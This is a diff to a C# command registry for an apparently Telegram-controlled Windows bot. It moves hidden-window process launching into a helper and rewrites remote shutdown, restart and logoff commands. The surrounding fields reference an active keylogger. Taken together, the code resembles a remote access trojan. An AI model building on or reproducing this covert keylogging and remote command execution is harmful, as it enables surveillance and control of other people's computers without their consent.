@@ -27,6 +27,19 @@ public static class CommandRegistry
     private static bool KeylogActive = false;
     private static Func<List<uint>> KeylogKeyProvider = Keylogger.GetPressingKeys;
     private static Func<uint, char> KeylogKeyMapper = WinAPI.MapVirtualKey;
+    internal static Func<ProcessStartInfo, Process?> ProcessStarter { get; set; } = info => Process.Start(info);
+
+    private static void StartProcess(string fileName, string arguments)
+    {
+        var startInfo = new ProcessStartInfo
+        {
+            FileName = fileName,
+            Arguments = arguments,
+            CreateNoWindow = true
+        };
+
+        ProcessStarter(startInfo);
+    }
 
     public static void InitializeCommands(ICollection<BotCommand> commandsList)
     {
@@ -301,30 +314,27 @@ public static class CommandRegistry
                     switch (model.Args[0].ToLower())
                     {
                         case "off":
-                            Process shutdown = new Process();
-                            shutdown.StartInfo.CreateNoWindow = true;
-                            shutdown.StartInfo.FileName = "powershell.exe";
-                            shutdown.StartInfo.Arguments = "/c shutdown /s /t 1";
-                            await Program.Bot.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
-                            shutdown.Start();
+                            await Program.Bot.SendMessage(
+                                model.Message.Chat.Id,
+                                "Done!",
+                                replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
+                            StartProcess("powershell.exe", "/c shutdown /s /t 1");
                             break;
 
                         case "restart":
-                            Process restart = new Process();
-                            restart.StartInfo.CreateNoWindow = true;
-                            restart.StartInfo.FileName = "powershell.exe";
-                            restart.StartInfo.Arguments = "/c shutdown /r /t 1";
-                            await Program.Bot.SendMessage(model.Message.Chat.Id, "Done!");
-                            restart.Start();
+                            await Program.Bot.SendMessage(
+                                model.Message.Chat.Id,
+                                "Done!",
+                                replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
+                            StartProcess("powershell.exe", "/c shutdown /r /t 1");
                             break;
 
                         case "logoff":
-                            Process logoff = new Process();
-                            logoff.StartInfo.CreateNoWindow = true;
-                            logoff.StartInfo.FileName = "cmd.exe";
-                            logoff.StartInfo.Arguments = "/c rundll32.exe user32.dll,LockWorkStation";
-                            await Program.Bot.SendMessage(model.Message.Chat.Id, "Done!");
-                            logoff.Start();
+                            await Program.Bot.SendMessage(
+                                model.Message.Chat.Id,
+                                "Done!",
+                                replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
+                            StartProcess("cmd.exe", "/c shutdown /l");
                             break;
 
                         default:
